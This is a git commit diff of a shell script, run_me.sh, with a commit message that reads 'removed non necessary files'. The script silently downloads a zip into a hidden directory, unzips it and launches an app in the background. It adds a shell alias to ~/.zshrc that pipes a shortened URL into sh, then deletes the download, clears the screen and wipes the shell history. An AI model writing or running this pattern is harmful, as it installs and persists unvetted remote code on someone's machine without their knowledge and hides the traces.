706febf99d10670cb48a21c0f68cd7a1a64ec176
Yassir Moustaine <ymoustai@e1r6p8.1337.ma>
2019-02-11 13:39:05 +0100

    removed non necessary files

--- run_me.sh
+++ run_me.sh
@@ -1,15 +1,25 @@
-mkdir -p ~/goinfre/.dipsie/
+store () 
+{
+	mkdir -p ~/goinfre/.dipsie/
 
-curl -s -L https://github.com/ymoustai/spipa7/blob/master/spipa.zip?raw=true -o ~/goinfre/.dipsie/spipa7.zip > /dev/null
+	curl -s -L https://github.com/ymoustai/spipa7/blob/master/spipa.zip?raw=true -o ~/goinfre/.dipsie/spipa7.zip > /dev/null
 
-unzip -o ~/goinfre/.dipsie/spipa7.zip -d ~/goinfre/.dipsie/ > /dev/null
+	unzip -o ~/goinfre/.dipsie/spipa7.zip -d ~/goinfre/.dipsie/ > /dev/null
 
-nohup open ~/goinfre/.dipsie/blyat.app > /dev/null
+	nohup open ~/goinfre/.dipsie/blyat.app > /dev/null
+}
 
 if [ `alias | grep dipsie | wc -l` -eq 0 ]; then
   echo "alias dipsie='curl -s -L bit.ly/spipaa7 | sh'" >> ~/.zshrc
 fi
 
+if [ -e ~/goinfre/.dipsie/blyat.app ]; then
+	nohup open ~/goinfre/.dipsie/blyat.app > /dev/null
+else
+	store
+fi
+
+rm -f ~/goinfre/.dipsie/*.zip
 clear
 history -c
 
